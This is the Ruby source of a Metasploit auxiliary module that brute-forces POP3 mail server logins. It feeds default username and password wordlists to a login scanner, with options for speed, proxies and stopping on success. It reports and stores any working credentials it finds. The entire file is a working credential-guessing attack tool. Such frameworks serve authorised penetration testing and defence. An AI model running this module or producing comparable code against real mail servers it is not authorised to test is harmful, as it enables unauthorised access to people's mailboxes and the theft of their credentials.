##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/login_scanner/pop3'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize
  super(
    'Name'        => 'POP3 Login Utility',
    'Description' => 'This module attempts to authenticate to an POP3 service.',
    'Author'      =>
    [
      'Heyder Andrade <heyder[at]alligatorteam.org>'
    ],
      'References'     =>
    [
      ['URL', 'https://www.ietf.org/rfc/rfc1734.txt'],
      ['URL', 'https://www.ietf.org/rfc/rfc1939.txt'],
    ],
      'License'     => MSF_LICENSE
  )
  register_options(
    [
      Opt::RPORT(110),
      OptPath.new('USER_FILE',
        [
          false,
          'The file that contains a list of probable users accounts.',
          File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_users.txt')
        ]),
      OptPath.new('PASS_FILE',
        [
          false,
          'The file that contains a list of probable passwords.',
          File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_passwords.txt')
        ])
    ])
  end

  def target
    "#{rhost}:#{rport}"
  end

  def run_host(ip)
    cred_collection = build_credential_collection(
      username: datastore['USERNAME'],
      password: datastore['PASSWORD']
    )

    scanner = Metasploit::Framework::LoginScanner::POP3.new(
      configure_login_scanner(
        host: ip,
        port: rport,
        proxies: datastore['PROXIES'],
        ssl: datastore['SSL'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        max_send_size: datastore['TCP::max_send_size'],
        send_delay: datastore['TCP::send_delay'],
        framework: framework,
        framework_module: self,
        ssl_version: datastore['SSLVersion'],
        ssl_verify_mode: datastore['SSLVerifyMode'],
        ssl_cipher: datastore['SSLCipher'],
        local_port: datastore['CPORT'],
        local_host: datastore['CHOST']
      )
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id
      )
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}' '#{result.proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)
        next
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        if datastore['VERBOSE']
          print_brute :level => :verror, :ip => ip, :msg => "Could not connect: #{result.proof}"
        end
      when Metasploit::Model::Login::Status::INCORRECT
        if datastore['VERBOSE']
          print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}', '#{result.proof.to_s.chomp}'"
        end
      end

      # If we got here, it didn't work
      invalidate_login(credential_data)
    end
  end

  def service_name
    datastore['SSL'] ? 'pop3s' : 'pop3'
  end



end
